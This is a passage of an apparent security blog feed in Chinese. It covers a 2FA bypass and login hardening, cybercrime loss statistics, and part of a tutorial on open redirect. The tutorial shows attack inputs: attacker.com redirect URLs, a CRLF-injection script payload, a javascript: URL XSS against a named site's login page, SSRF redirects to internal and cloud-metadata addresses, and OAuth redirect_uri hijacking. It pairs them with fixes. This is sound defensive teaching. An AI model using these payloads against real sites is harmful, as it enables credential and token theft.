這兩個並沒有關聯。也就是說，我今天只要拿一個已經驗證成功的 <code>txid</code> 搭配任意我想要認證的 <code>sid</code>，系統根本分不出來這個狀態是不是屬於這個身份，就像畢業證書上如果沒有寫名字，那任何人都可以拿這張紙說自己畢業了。</p>\n<p>如下圖，駭客只要自己擁有一個帳號並且知道受害者的帳號密碼，就可以用自己驗證成功的 <code>txid</code> 搭配用受害者帳密嘗試登入的 <code>sid</code> 來騙過系統完成驗證。你可以在這裡找到更詳細的 <a href=\"https://sensepost.com/blog/2021/duo-two-factor-authentication-bypass/\">writeup</a>。</p>\n<p><figure><img src=\"/img/posts/crystal/authentication/duo-bypass.png\" /><figcaption><p>2FA bypass</p>\n</figcaption></figure></p>\n<h2 id=\"%E9%82%A3%E6%88%91%E8%A9%B2%E6%80%8E%E9%BA%BC%E9%98%B2%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E9%82%A3%E6%88%91%E8%A9%B2%E6%80%8E%E9%BA%BC%E9%98%B2%EF%BC%9F\">#</a> 那我該怎麼防？</h2>\n<p>小明聽了這麼多早已暈頭轉向，到底該做到哪些機制或遵守哪些準則呢？</p>\n<p>小明跟阿柚經過一番討論，列出了一系列注意事項：</p>\n<ul>\n<li>確保登入資料必須經由 HTTPS 加密通道傳送</li>\n<li>不要在驗證完成前的 response 中透露登入者的 username 或是 email 等資訊</li>\n<li>防止駭客自動化暴力破解：\n<ul>\n<li>登入失敗的錯誤訊息應該盡可能籠統而單一，不要過於詳細</li>\n<li>防止駭客透過回覆速度或是頁面中的資訊判別某個帳號是否存在系統中</li>\n<li>應限制帳戶可嘗試登入的次數，例如鎖帳戶或是需等待一段時間才能嘗試</li>\n<li>同時可以做 IP-based rate limiting 限制請求發送速率</li>\n<li>加入其他防自動化的機制，如 CAPTCHA</li>\n</ul>\n</li>\n<li>確保程式邏輯沒有漏洞（包含登入、密碼重置、多因素驗證等等）</li>\n<li>幫助使用者設定強一些的密碼，例如 JavaScript 函式庫 zxcvbn 會在使用者建立帳號時進行檢查，禁止使用者選擇強度不足的密碼。雖然不代表密碼一定安全，但至少會符合一定強度的密碼規則，例如：至少八個字元、需使用大小寫與特殊符號、不能跟帳號類似等等。</li>\n</ul>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> 結語</h2>\n<p>看似簡單又常見的登入功能，其實細節中藏著非常多的魔鬼。尤其大多數比較敏感的動作跟資訊都要先經過登入才能存取，如果連這個守門人都不可靠，那可說是門戶大開呀！進行身份驗證時，務必多檢查是否能抵檔駭客的暴力破解以及是否存在邏輯上的缺失，越關鍵的功能越是需要多層防護。</p>\n<p>被盜帳號是誰的錯呢？想想你都用哪些密碼跟服務吧，要是你註冊任何服務都用同樣幾組密碼，又使用一些安全等級堪憂的網站，可要小心囉！</p>\n",
      "date_published": "2021-09-16T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/nick/cybersecurity-loss/",
      "url": "https://tech-blog.cymetrics.io/posts/nick/cybersecurity-loss/",
      "title": "資安弱點會造成多大損失 ?",
      "content_html": "<h1 id=\"%E8%B3%87%E5%AE%89%E5%BC%B1%E9%BB%9E%E6%9C%83%E9%80%A0%E6%88%90%E5%A4%9A%E5%A4%A7%E6%90%8D%E5%A4%B1-%3F\"><a class=\"direct-link\" href=\"#%E8%B3%87%E5%AE%89%E5%BC%B1%E9%BB%9E%E6%9C%83%E9%80%A0%E6%88%90%E5%A4%9A%E5%A4%A7%E6%90%8D%E5%A4%B1-%3F\">#</a> 資安弱點會造成多大損失 ?</h1>\n<p><img src=\"/img/posts/nick/cybersecurity-loss/cl_1.jpg\" alt=\"\"></p>\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<p>當碰到資安問題時，會馬上跟著遇到另一個難題，就是這個問題到底要不要修 ? 就像得感冒的時候可能會考慮不吃藥忍一忍，賭自己的身體夠健康，但如果中的是 Covid-19 肯定不會猶豫要不要買藥，只會擔心買不到藥，畢竟兩者的嚴重性差太多了。</p>\n<!-- summary -->\n<p>嚴重性是在發現問題時決定要不要處理的關鍵，這通常由發生機率與影響程度來決定，本文要帶大家試著從另外一個角度來看，從過去資安事件造成的損失來評估問題的嚴重性。</p>\n<!-- summary -->\n<h2 id=\"%E8%B3%87%E6%96%99%E4%BE%86%E6%BA%90\"><a class=\"direct-link\" href=\"#%E8%B3%87%E6%96%99%E4%BE%86%E6%BA%90\">#</a> 資料來源</h2>\n<p>在分析之前先簡單介紹一下引用的資料的來源，因為資安事件中包含很多敏感資訊，一般的狀況下取得詳細資料較為困難。</p>\n<ul>\n<li>機構名稱: IC3(Internet Crime Complaint Center)</li>\n<li>官方網址: <a href=\"https://www.ic3.gov/\">https://www.ic3.gov/</a></li>\n<li>簡介:<br>\nIC3 是 聯邦調查局 (FBI) 旗下的組織，也是美國最大的資安通報系統，主要提供一個可靠、方便的報告機制，以便向聯邦調查局(FBI) 提交與網路犯罪有關的資訊，IC3 在藉由這些資料進行調查與通知相關執法機構。</li>\n</ul>\n<h2 id=\"%E5%88%86%E6%9E%90%E6%AF%94%E8%BC%83\"><a class=\"direct-link\" href=\"#%E5%88%86%E6%9E%90%E6%AF%94%E8%BC%83\">#</a> 分析比較</h2>\n<h3 id=\"1.-%E5%8E%9F%E5%A7%8B%E5%A0%B1%E5%91%8A%3A-ic3-annual-report\"><a class=\"direct-link\" href=\"#1.-%E5%8E%9F%E5%A7%8B%E5%A0%B1%E5%91%8A%3A-ic3-annual-report\">#</a> 1. 原始報告: IC3 Annual Report</h3>\n<p>IC3 統計了網路犯罪所造成的金額損失，並以犯罪手法的方式來分類。<br>\n<img src=\"/img/posts/nick/cybersecurity-loss/cl_2.jpg\" alt=\"\"></p>\n<center style=\"font-size:14px;color:#C0C0C0;text-decoration:underline\">https://www.ic3.gov/Media/PDF/AnnualReport/2020_IC3Report.pdf</center>\n<br>\n<p>從這張表格中我們可以看出前三名分別是</p>\n<ol>\n<li><strong>BEC/EAC：</strong><br>\n透過電子郵件對匯款或付款資訊進行詐騙，使被害者匯錢到攻擊者的帳戶，BEC 指的是攻擊對象為公司，EAC 則是針對個人。</li>\n<li><strong>Confidence Fraud/Romance：</strong><br>\n假裝成被害者信任的對象，讓被害者向攻擊者發送有價值的物品或資訊。</li>\n<li><strong>Investment：</strong><br>\n誘使被害者根據虛假信息進行購買，通常以高報酬低風險來誘拐受害者。</li>\n</ol>\n<p>損失金額最高的 BEC/EAC 與電子郵件有最高的關聯性，如果要預防該問題必須要在郵件伺服器上做處理，接下來便以問題發生點來分析資安事件導致的金融損失</p>\n<h3 id=\"2.-%E5%88%86%E6%9E%90%E5%A0%B1%E5%91%8A%3A-%E5%95%8F%E9%A1%8C%E9%BB%9E\"><a class=\"direct-link\" href=\"#2.-%E5%88%86%E6%9E%90%E5%A0%B1%E5%91%8A%3A-%E5%95%8F%E9%A1%8C%E9%BB%9E\">#</a> 2. 分析報告: 問題點</h3>\n<p>這邊將資安問題藉由發生點分為四類，部分資安事件會有一個以上的類型。<br>\n(ex. Phishing 可能發生在惡意郵件或釣魚網站)</p>\n<ul>\n<li><strong>電子郵件</strong> : 在攻擊者能成功寄電子郵件給被害者的狀況下可能發生的攻擊。</li>\n<li><strong>帳號密碼</strong> : 攻擊者知道被害者的帳號或密碼後可能發生的攻擊。</li>\n<li><strong>網站</strong> : 攻擊者對被害者網站發動攻擊，或者反過來誘導被害者連到惡意網站。</li>\n<li><strong>網路服務</strong> : 在攻擊者接觸到被害者對外開放的服務(ex. FTP, SMB...)後可能發生的攻擊。</li>\n</ul>\n<img data-deopt=\"true\" src=\"/img/posts/nick/cybersecurity-loss/cl_3.jpg\">\n<p>所以我們可以從這張圖看出，在 2020 年有超過一半的損失是來自電子郵件未做好保護，損失第二高的是來自網站漏洞，剩下的一成則是由帳號密碼外流與對外開放網路服務的所導致。</p>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> 結論</h2>\n<img data-deopt=\"true\" src=\"/img/posts/nick/cybersecurity-loss/cl_4.jpg\">\n<p>接著分享一下如果要遇防問題發生該怎麼做。</p>\n<ol>\n<li>\n<p><strong>電子郵件</strong> : 3240 million<br>\n要預防與電子郵件有關的資安問題有兩個主要目標，第一是降低收到惡意郵件的機會，做好郵件伺服器的設定，或者直接選用高安全性的郵件服務，第二是降地惡意信件的影響，建議進行社交工程演練，從中學習收到可疑郵件的處理流程，降低發生率跟影響之後，安全等級自然會上升。</p>\n<p>如果要做郵件伺服器的設定，又不知道從何開始，可以參考技術部落格的另一篇文章。<br>\n<a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory/\">關於 email security 的大小事 — 原理篇</a></p>\n</li>\n<li>\n<p><strong>網站</strong> : 1749 million<br>\n要提升網站的資安等級則建議先檢查有沒有常見問題，像是 Owasp Top 10 或是 Cwe Top 25，藉由增加駭客的攻擊成本，降低駭客對自家網站的興趣，接著等到有時間和預算後找第三方廠商做一次完整的滲透測試，由專業的資安團隊來檢查網站有沒有問題，避免球員兼裁判導致疏漏。</p>\n</li>\n<li>\n<p><strong>帳號密碼</strong> : 349 million<br>\n要確保帳號密碼安全則有三件事要注意</p>\n<ol>\n<li>使用高強度的密碼，降低暴力破解可能性</li>\n<li>定期更換密碼，縮短密碼外流後攻擊的有效時間</li>\n<li>避免同一組帳密用在不同的地方，減少帳密外流後的影響範圍。</li>\n</ol>\n<p>這邊推薦一個網站可以查詢自己的帳號密碼是否已經外流<br>\n<a href=\"https://haveibeenpwned.com/\">have i been pwned?</a></p>\n</li>\n<li>\n<p><strong>網路服務</strong> : 188 million<br>\n先檢查自己的設備對外開放了哪些服務，在檢查服務的版本，有這兩個資訊後就可以到 <a href=\"https://www.cvedetails.com/\">CVE Detail</a> 查詢服務的弱點，如果有弱點的話盡快升級到安全的版本，如果沒辦法升級，可以考慮利用 VPN 將這些對外服務轉成對內服務，避免駭客有直接利用這些弱點的機會。</p>\n</li>\n</ol>\n",
      "date_published": "2021-09-09T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/open-redirect/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/open-redirect/",
      "title": "在做跳轉功能時應該注意的問題：Open Redirect",
      "content_html": "<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<!-- summary -->\n<p>在許多網站中都有個很常見的功能，就是重新導向。</p>\n<p>舉例來說，如果要觀看的頁面需要權限但是使用者還沒登入，就會先把使用者導去登入頁面，登入完之後再導回原本要去的頁面。</p>\n<!-- summary -->\n<p>例如說今天有個社群網站，想要看個人檔案的話需要登入，而小明的個人檔案網址是：<code>https://example.com/profile/ming</code>，那我身為一個訪客，點進去之後就會跳轉到登入頁面，並且帶上我原本要去的網址當作參數：<br>\n<code>https://example.com/login?redirect=https://example.com/profile/ming</code></p>\n<p>登入成功之後，網站就會根據 <code>redirect</code> 的值，把我導去原本要前往的頁面。</p>\n<p>雖然看起來是個小功能，但其實背後有不少安全性的問題要考慮。</p>\n<h2 id=\"%E4%BB%80%E9%BA%BC%E6%98%AF-open-redirect%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E4%BB%80%E9%BA%BC%E6%98%AF-open-redirect%EF%BC%9F\">#</a> 什麼是 open redirect？</h2>\n<p>Open redirect，中文通常翻作開放式重定向或是公開重定向之類的，但我自己喜歡翻成：「任意重新導向」，覺得比較貼近原意，就是可以重新導向到任意目的地。</p>\n<p>以文章開頭的例子來說，攻擊者其實可以在 URL 上面帶任何值，例如說：<code>https://attacker.com</code>，這樣使用者在登入之後，就會跳轉到這個頁面。</p>\n<p>像這個就是需要使用者操作（登入）才能觸發重新導向，但有些功能無需使用者操作，可能就有著重新導向的功能。以登入的這個例子來說，假設使用者已經登入了，那 <code>https://example.com/login?redirect=https://attacker.com</code> 這個連結點下去之後，系統偵測到已經登入，就會直接把使用者轉到 <code>https://attacker.com</code>。</p>\n<p>這造成的結果是什麼呢？</p>\n<p>使用者點了一個 <a href=\"http://example.com\">example.com</a> 的連結，卻在無意間被轉到 <a href=\"http://attacker.com\">attacker.com</a> 去。這種可以直接把使用者導到任意地方去的漏洞，就叫做 open redirect。</p>\n<h2 id=\"open-redirect-%E8%83%BD%E9%80%A0%E6%88%90%E4%BB%80%E9%BA%BC%E5%95%8F%E9%A1%8C%EF%BC%9F\"><a class=\"direct-link\" href=\"#open-redirect-%E8%83%BD%E9%80%A0%E6%88%90%E4%BB%80%E9%BA%BC%E5%95%8F%E9%A1%8C%EF%BC%9F\">#</a> Open redirect 能造成什麼問題？</h2>\n<p>一個最直覺能想到的攻擊方式，大概就是釣魚網站了。在講攻擊手法的時候，我覺得「情境」是一個滿重要的因素，有些看似沒什麼的攻擊，在搭配適當的情境之後，你會覺得「哇，好像滿容易成功的」。</p>\n<p>在看得到網址的狀況下，你看到陌生的網址就會比較小心翼翼，因為你知道可能會是詐騙或是釣魚網站；但若是看到熟悉的網址，會放鬆一些戒心：</p>\n<p><img src=\"/img/posts/huli/open-redirect/chat.png\" alt=\"\"></p>\n<p>圖上的網址最後那段其實是 <a href=\"https://attacker.com\">https://attacker.com</a> url encode 過的結果，所以使用者根本不會注意到後面那串，只會看到前面是由 <a href=\"http://facebookb.com\">facebookb.com</a> 開頭，這邊我想強調的事情是「看到熟悉的網址，使用者會比較沒有戒心」。</p>\n<p>但這樣子的情境，其實很類似的網址也可以達成差不多的事情（只是效力比較低），例如說 <a href=\"http://facebo0k.com\">facebo0k.com</a> 或是 <a href=\"http://myfacebook.com\">myfacebook.com</a> 之類的。</p>\n<p>這時候可以再設想另外一個情境，就是有些網站當你點擊外部連結的時候，會提醒你說：「你要連到外部網站了喔，要小心喔」，這時候如果利用 open redirect 的話，網站可能就不會跳出提示（因為是同一個網域），使用者或許就在無意之間跳到了別的網站而不自知。</p>\n<p>例如說今天有個論壇好了，有個地方有 open redirect 的漏洞，然後我在文章裡面放了一個連結，利用 open redirect 讓跳去外部網站的提示失效，而使用者點了連結之後會到「精心設計的釣魚網站」，介面長得一模一樣，但是跳出個要輸入帳號密碼的 popup 跟你說你的連線階段已過期，請重新登入。這時使用者就有比較高的機率會去輸入帳號密碼，因為沒有想到自己被跳轉到釣魚網站。</p>\n<p>以上這些問題，都只是在討論 open redirect 「不跟其他漏洞結合」的狀況下，可以造成哪些危害，聽起來好像還好對吧？跟其他攻擊比起來似乎沒什麼，但是 open redirect 被低估的地方，其實是在它與其他漏洞的結合之後，可以發揮出的威力。</p>\n<p>在繼續往下之前，我們必須先了解一下重新導向的實作，主要分為兩種：</p>\n<ol>\n<li>後端重新導向，透過 response header <code>Location</code></li>\n<li>前端重新導向，可能透過 history.push 或是 window.open 以及 location 等等</li>\n</ol>\n<p>第一種透過後端來做 redirect，是靠 server 回傳 <code>Location</code> 這個 header，瀏覽器就會把使用者導到相對應的地方去。實作上可能會像是這樣：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">handler</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  res<span class=\"token punctuation\">.</span><span class=\"token function\">setStatus</span><span class=\"token punctuation\">(</span><span class=\"token number\">302</span><span class=\"token punctuation\">)</span><br>  res<span class=\"token punctuation\">.</span><span class=\"token function\">setHeader</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Location: '</span> <span class=\"token operator\">+</span> req<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>redirect<span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">return</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>而第二種由前端實作的就不太一樣了，一個常見的範例是直接把要去的地方 assign 給 <code>window.location</code> 做頁面跳轉：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> searchParams <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URLSearchParams</span><span class=\"token punctuation\">(</span>location<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">)</span><br>window<span class=\"token punctuation\">.</span>location <span class=\"token operator\">=</span> searchParams<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'redirect'</span><span class=\"token punctuation\">)</span></code></pre>\n<p>或如果是 SPA 不想換頁的話，可能會直接用 <code>history.push</code> 或是框架內建的 router.push。</p>\n<p>而無論是前端還是後端來做重新導向，光是實作方式都有各自的問題需要處理。</p>\n<h2 id=\"%E5%BE%8C%E7%AB%AF%EF%BC%9Acrlf-injection\"><a class=\"direct-link\" href=\"#%E5%BE%8C%E7%AB%AF%EF%BC%9Acrlf-injection\">#</a> 後端：CRLF injection</h2>\n<p>後端的重新導向中，會把傳過來的值塞到 <code>Location</code> 這個 response header 裡面。有些 server 或是 framework 如果沒有處理好的話，可以塞入換行字元，例如說把重新導向的網址設定為 <code>abc\\ntest:123</code>，有可能 response 就變成：</p>\n<pre><code>HTTP/2 302 Found\nLocation: abc\ntest:123\n</code></pre>\n<p>那若是改成：<code>abc\\n\\n&lt;script&gt;alert(1)&lt;/script&gt;</code>，response 就會變成：</p>\n<pre><code>HTTP/2 302 Found\nLocation: abc\n<p>&lt;script&gt;alert(1)&lt;/script&gt;<br>\n....<br>\n</code></pre></p>\n<p>藉由 CRLF injection 去改變 response body 的內容，但很遺憾似乎無法直接達成 XSS，因為瀏覽器看到 status code 是 301/302 時會忽略 response body，直接把使用者導去目標頁面。</p>\n<p>我找到可以運作的資料都已經是四五年前的了：</p>\n<ol>\n<li><a href=\"https://hackerone.com/reports/192667\">[stagecafrstore.starbucks.com] CRLF Injection, XSS</a></li>\n<li><a href=\"https://hackerone.com/reports/260744\">[dev.twitter.com] XSS and Open Redirect</a></li>\n</ol>\n<p>我記得我好像看過有篇文章在講這種情況應該怎麼辦，但我找很久都找不到，如果知道該怎麼繞過的請告訴我。</p>\n<p>不過就算改變 response body 沒什麼用，改變其他的 header 也可能串聯其他攻擊，例如說 Set-Cookie，可以幫使用者設置任意 cookie，就有機會再串接 session fixation 或是 CSRF 之類的攻擊。</p>\n<h2 id=\"%E5%89%8D%E7%AB%AF%EF%BC%9Axss\"><a class=\"direct-link\" href=\"#%E5%89%8D%E7%AB%AF%EF%BC%9Axss\">#</a> 前端：XSS</h2>\n<p>如果是前端實作的重新導向，要特別注意的一個問題就是 XSS。</p>\n<p>你可能會疑惑重新導向跟 XSS 有什麼關係，我們先來回顧一下前端重新導向的程式碼：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> searchParams <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URLSearchParams</span><span class=\"token punctuation\">(</span>location<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">)</span><br>window<span class=\"token punctuation\">.</span>location <span class=\"token operator\">=</span> searchParams<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'redirect'</span><span class=\"token punctuation\">)</span></code></pre>\n<p>這樣會有什麼問題呢？</p>\n<p>在 JS 裡面有個應該不少人看過，但可能比較少用的東西，叫做 JavaScript pseudo protocol，像是這樣：</p>\n<pre><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;click me&lt;/a&gt;\n</code></pre>\n<p>點了那個 a 之後，會執行 JS 跳出一個 alert。而這招除了可以用在 href 以外，其實也可以用在 location 上面：</p>\n<pre class=\"language-js\"><code class=\"language-js\">window<span class=\"token punctuation\">.</span>location <span class=\"token operator\">=</span> <span class=\"token string\">'javascript:alert(1)'</span></code></pre>\n<p>打開你的瀏覽器開新分頁，然後在 devtool console 直接執行上面那一段，會發現 alert 真的跳出來了，而且以下幾種方式都會觸發：</p>\n<pre class=\"language-js\"><code class=\"language-js\">window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href <span class=\"token operator\">=</span> <span class=\"token string\">'javascript:alert(1)'</span><br>window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span><span class=\"token function\">assign</span><span class=\"token punctuation\">(</span><span class=\"token string\">'javascript:alert(1)'</span><span class=\"token punctuation\">)</span><br>window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">'javascript:alert(1)'</span><span class=\"token punctuation\">)</span></code></pre>\n<p>因此攻擊者只要把 redirect 的位置設置成 <code>javascript:xxx</code>，就可以執行任意程式碼，觸發 XSS。這個案例前端的朋友們一定要特別注意，因為直接把值 assign 給 location 是個很常見的實作方式。</p>\n<p>底下直接帶大家看一個真實世界的案例，對象是之前在另一篇文章：<a href=\"https://tech-blog.cymetrics.io/posts/huli/prevent-xss-might-be-harder-than-you-thought/\">防止 XSS 可能比想像中困難</a>出現過的網站：<a href=\"https://matters.news/\">Matters News</a>。</p>\n<p>這是他們的登入頁面：</p>\n<p><img src=\"/img/posts/huli/open-redirect/matters.png\" alt=\"\"></p>\n<p>在點下登入之後，會呼叫一個叫做 <code>redirectToTarget</code> 的 function，而這個函式的程式碼是這樣：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">/**<br> * Redirect to \"?target=\" or fallback URL with page reload.<br> *<br> * (works on CSR)<br> */</span><br><span class=\"token keyword\">export</span> <span class=\"token keyword\">const</span> redirectToTarget <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>  fallback <span class=\"token operator\">=</span> <span class=\"token string\">'current'</span><span class=\"token punctuation\">,</span><br><span class=\"token punctuation\">}</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>  fallback<span class=\"token operator\">?</span><span class=\"token operator\">:</span> <span class=\"token string\">'homepage'</span> <span class=\"token operator\">|</span> <span class=\"token string\">'current'</span><br><span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">const</span> fallbackTarget <span class=\"token operator\">=</span><br>    fallback <span class=\"token operator\">===</span> <span class=\"token string\">'homepage'</span><br>      <span class=\"token operator\">?</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">/</span><span class=\"token template-punctuation string\">`</span></span> <span class=\"token comment\">// FIXME: to purge cache</span><br>      <span class=\"token operator\">:</span> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<br>  <span class=\"token keyword\">const</span> target <span class=\"token operator\">=</span> <span class=\"token function\">getTarget</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> fallbackTarget<br><br>  window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href <span class=\"token operator\">=</span> <span class=\"token function\">decodeURIComponent</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>在拿到 target 之後直接使用了：<code>window.location.href = decodeURIComponent(target)</code> 來做重新導向。而 <code>getTarget</code> 其實就是去 url query string 把 target 的值拿出來。所以如果登入的網址是：<code>https://matters.news/login?target=javascript:alert(1)</code>，在使用者按下登入並且成功之後，就會跳出一個 alert，觸發 XSS！</p>\n<p>不僅如此，這個 XSS 一旦被觸發了，影響力非同小可，因為這是登入頁面，所以在這個頁面上執行的 XSS，可以直接抓取 input 的值，也就是偷到使用者的帳號密碼。如果要執行實際的攻擊，可以針對網站的使用者寄發釣魚信，在信中放入這個惡意連結讓使用者點擊，由於網址是正常的網址，點擊之後到的頁面也是真的網站的頁面，因此可信程度應該滿高的。</p>\n<p>在使用者輸入帳號密碼並且登入之後，用 XSS 把帳號密碼偷走並把使用者導回首頁，就可以不留痕跡地偷走使用者帳號，達成帳號奪取。</p>\n<p>修復方式是只允許 http/https 開頭的網址：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> fallbackTarget <span class=\"token operator\">=</span><br>  fallback <span class=\"token operator\">===</span> <span class=\"token string\">'homepage'</span><br>    <span class=\"token operator\">?</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">/</span><span class=\"token template-punctuation string\">`</span></span> <span class=\"token comment\">// FIXME: to purge cache</span><br>    <span class=\"token operator\">:</span> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<br><span class=\"token keyword\">let</span> target <span class=\"token operator\">=</span> <span class=\"token function\">decodeURIComponent</span><span class=\"token punctuation\">(</span><span class=\"token function\">getTarget</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br><span class=\"token keyword\">const</span> isValidTarget <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">^((http|https):\\/\\/)</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><br><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>isValidTarget<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  target <span class=\"token operator\">=</span> fallbackTarget<br><span class=\"token punctuation\">}</span><br><br>window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href <span class=\"token operator\">=</span> target <span class=\"token operator\">||</span> fallbackTarget</code></pre>\n<p>不過這樣其實是先把重新導向功能的 XSS 修掉而已，open redirect 的部分依舊存在，需要進一步對 domain 做檢查才能排除 open redirect。</p>\n<p>再次提醒，這個漏洞滿多工程師都不會發現，因為不知道 <code>window.location.href</code> 可以放 <code>javascript:alert(1)</code> 這樣的網址來執行程式碼，如果大家有實作到重新導向的功能，記得注意一下這個問題。</p>\n<h2 id=\"open-redirect-%E8%88%87%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E9%85%8D\"><a class=\"direct-link\" href=\"#open-redirect-%E8%88%87%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E9%85%8D\">#</a> Open redirect 與其他漏洞的搭配</h2>\n<p>從上面兩個問題可以看出光是「實作重新導向」就可能會寫出有漏洞的程式碼，而接下來要談的是「重新導向」這個功能與其他漏洞的結合。有至少兩個類型的漏洞都有機會與 open redirect 結合，一個是 SSRF，另一個是 OAuth 的漏洞。</p>\n<p>SSRF，全名為 Server-Side Request Forgery，通常翻作伺服器請求偽造，關於這個漏洞詳細的介紹跟攻擊未來可能再寫一篇跟大家介紹，我這邊先簡單講一下。</p>\n<p>通常在內部的 Server，都不會讓外部直接存取到，對外可能只會有一台 proxy 把 request forward 到對應的主機。假設有一個服務的伺服器架構如下圖所示，背後有一台 Back-end Server 會去呼叫隱藏在內網中的 PDF service 產生 PDF 檔案：</p>\n<p><img src=\"/img/posts/huli/open-redirect/ssrf.png\" alt=\"\"></p>\n<p>而這個 PDF service 限制網址只能是 <a href=\"https://example.com\">https://example.com</a> 開頭，避免有人傳入其他網址進來。這時如果某個 URL 有 open redirect 的漏洞，攻擊者就可以傳入：<code>https://example.com?redirect=http://127.0.0.1</code>，讓 PDF service 去造訪這個網址，而被轉址到 127.0.0.1，並且回傳它的內容。</p>\n<p>這樣就叫做 SSRF，你透過內部的服務，成功發了一個 request 到外網進不去的 service，如此一來你就可以去看看內網還有什麼其他服務存在，例如說 Redis 或是 MySQL 等等，這些直接從外網都進不去，但透過 SSRF 就可以。或更簡單的方式是去看一些 cloud 相關的檔案，有些 cloud 服務只要存取 <a href=\"http://169.254.169.254\">http://169.254.169.254</a> 就會看到一些 metadata，有興趣可以看這邊：<a href=\"https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#exploitation-in-cloud\">Abusing SSRF in AWS EC2 environment</a>。</p>\n<p>所以透過 open redirect，可以繞過原本有做網址檢查的地方。</p>\n<p>第二個會碰到的問題則是跟 OAuth 有關，在 OAuth 的流程中通常都會有一個 redirect_uri，接收授權完畢之後的一個 code，以 Facebook 為例的話是長這樣：</p>\n<pre><code>https://www.facebook.com/v11.0/dialog/oauth?\n  client_id={app-id}\n  &amp;redirect_uri={&quot;https://example.com/login&quot;}\n  &amp;state={&quot;{st=state123abc,ds=123456789}&quot;}\n</code></pre>\n<p>使用者點擊網址後會跳到 Facebook，按下授權就會被導到 <a href=\"https://example.com/login\">https://example.com/login</a> 並且可以在網址中拿到 code 或是 token，接著就可以用這個搭配 client id 跟 client secret，拿到 auth token，並且用這個 auth token 代表使用者去跟 Facebook 拿取資料。</p>\n<p>如果 redirect_uri 的保護沒有做好，攻擊者就可以把它換成其他值，例如說：<code>redirect_uri=https://huli.tw</code>，這樣使用者點擊授權以後，就會把驗證用的 code 傳到我的網站，而不是預期中的網站。</p>\n<p>但一般來說 redirect_uri 都會限制 domain，所以沒那麼簡單就可以繞過。這時候就要請出 open redirect 登場了，如果網站有這個漏洞的話，就可以這樣：<code>redirect_uri=https://example.com?redirect=https://huli.tw</code>，如此一來就算符合 domain 限制，最後導向的地方依然是個外部網站，攻擊者一樣可以偷到驗證用的 code。</p>\n<p>所以為了避免這類型的攻擊，Facebook 或 Google 這種大型服務在設置 App 